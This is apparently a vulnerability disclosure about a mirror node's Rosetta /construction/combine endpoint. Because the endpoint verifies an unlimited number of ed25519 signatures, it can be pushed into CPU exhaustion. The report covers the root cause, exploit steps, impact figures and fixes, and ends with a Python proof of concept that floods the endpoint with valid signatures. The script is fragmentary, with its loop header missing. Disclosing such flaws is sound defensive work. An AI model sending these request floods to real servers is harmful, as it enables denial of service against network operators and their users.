### Title
Unbounded `ed25519.Verify()` Loop in `ConstructionCombine` Enables CPU Exhaustion DoS

### Summary
`ConstructionCombine` in `rosetta/app/services/construction_service.go` iterates over every entry in `request.Signatures` and calls `ed25519.Verify()` for each one, with no upper bound on the slice length. An unauthenticated attacker who pre-generates valid ed25519 key pairs and signs the transaction body offline can submit a single request carrying thousands of valid signatures, forcing the server to perform thousands of expensive elliptic-curve verifications synchronously, saturating CPU and degrading the mirror node's ability to process and forward legitimate transactions.

### Finding Description
**Exact code path:**

`rosetta/app/services/construction_service.go`, function `ConstructionCombine`, lines 58–87:

```go
// Line 58 – only guard: rejects empty, no upper bound
if len(request.Signatures) == 0 {
    return nil, errors.ErrNoSignature
}
// Lines 72-87 – unbounded loop
for _, signature := range request.Signatures {
    if signature.SignatureType != rTypes.Ed25519 {
        return nil, errors.ErrInvalidSignatureType
    }
    pubKey, err := hiero.PublicKeyFromBytes(signature.PublicKey.Bytes)
    if err != nil {
        return nil, errors.ErrInvalidPublicKey
    }
    if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) {
        return nil, errors.ErrInvalidSignatureVerification   // early exit only on INVALID sig
    }
    _, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes)
}
```

**Root cause:** The only pre-loop guard is `len == 0`. There is no maximum-signatures check. The early-exit at line 82 fires only when a signature is *invalid*, so an attacker who submits exclusively *valid* signatures forces the loop to run to completion regardless of how many entries are present.

**Exploit flow:**
1. Attacker generates N ed25519 key pairs offline (trivial; each takes ~1 µs).
2. Attacker obtains a valid `UnsignedTransaction` hex string (from `/construction/payloads` or by crafting a minimal frozen Hiero transaction).
3. Attacker calls `getFrozenTransactionBodyBytes` logic locally to derive `frozenBodyBytes`, then signs it with all N private keys.
4. Attacker POSTs a single `ConstructionCombineRequest` with N `Signatures` entries, all cryptographically valid.
5. The server executes `ed25519.Verify()` N times synchronously before returning.

**Why existing checks fail:**

- *Application layer*: No `http.MaxBytesReader` is applied to the request body in `main.go` (lines 220–227). No per-request signature count cap exists anywhere in the service.
- *Traefik middleware*: `charts/hedera-mirror-rosetta/values.yaml` line 95 sets `global.middleware: false`. The middleware template (`charts/hedera-mirror-rosetta/templates/middleware.yaml` line 3) gates on `{{ if and .Values.global.middleware .Values.middleware }}`, so the `inFlightReq` (5 concurrent) and `rateLimit` (10 req/s) Traefik rules are **not deployed by default**.
- *HTTP timeouts*: `ReadTimeout` is 5 s (5,000,000,000 ns, `docs/configuration.md` line 664). At 100 Mbps, ~62 MB can be received in 5 s. At ~350 bytes per JSON signature entry, that is ~177,000 signatures per request. At ~75 µs per `ed25519.Verify()`, one such request consumes ~13 CPU-seconds.

### Impact Explanation
A single attacker request with ~177,000 valid signatures saturates a CPU core for ~13 seconds. With even modest concurrency (e.g., 5 parallel connections), the mirror node's Go runtime goroutine pool is occupied with cryptographic work, starving the goroutines that handle legitimate Rosetta and importer traffic. Because the mirror node is the path through which transactions are forwarded to consensus nodes, sustained CPU exhaustion indirectly reduces the rate at which legitimate transactions reach the network — matching the "≥30% processing degradation without brute force" severity classification. The attack is amplified if the attacker distributes requests across multiple source IPs, bypassing any IP-based rate limiting even when Traefik middleware is enabled.

### Likelihood Explanation
No authentication or API key is required to call `/construction/combine`. Generating valid ed25519 signatures is computationally trivial and can be done entirely offline before sending the attack request. The endpoint is reachable by any external user. The default deployment (`global.middleware: false`) ships without rate limiting or concurrency caps. The attack is repeatable at will and requires no special knowledge beyond the Rosetta API specification.

### Recommendation
1. **Enforce a hard cap on signature count** inside `ConstructionCombine`, immediately after the `len == 0` check:
   ```go
   const maxSignatures = 100 // or the actual max signers for supported tx types
   if len(request.Signatures) > maxSignatures {
       return nil, errors.ErrTooManySignatures
   }
   ```
2. **Apply `http.MaxBytesReader`** in `main.go` before the router handles the request body, to enforce an absolute request-body size ceiling regardless of endpoint.
3. **Enable Traefik middleware by default** (`global.middleware: true`) or document that it must be enabled in production, and add per-IP concurrency limits.
4. Consider moving signature verification to a worker pool with a bounded queue so that even if the cap is misconfigured, CPU consumption is bounded.

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

# 1. Obtain a valid UnsignedTransaction from /construction/payloads (omitted for brevity)

    priv = Ed25519PrivateKey.generate()
    pub  = priv.public_key()
    sig  = priv.sign(frozen_body_bytes)
    pub_bytes = pub.public_bytes_raw()
    signatures.append({
        "signing_payload": {
            "hex_bytes": frozen_body_bytes.hex(),
            "signature_type": "ed25519"
        },
        "public_key": {
            "hex_bytes": pub_bytes.hex(),
            "curve_type": "edwards25519"
        },
        "signature_type": "ed25519",
        "hex_bytes": sig.hex()
    })

payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "unsigned_transaction": unsigned_tx_hex,
    "signatures": signatures
}

import requests
# 2. Submit – server will call ed25519.Verify() 10,000 times synchronously
r = requests.post("http://<mirror-node>:5700/construction/combine",
                  json=payload, timeout=60)
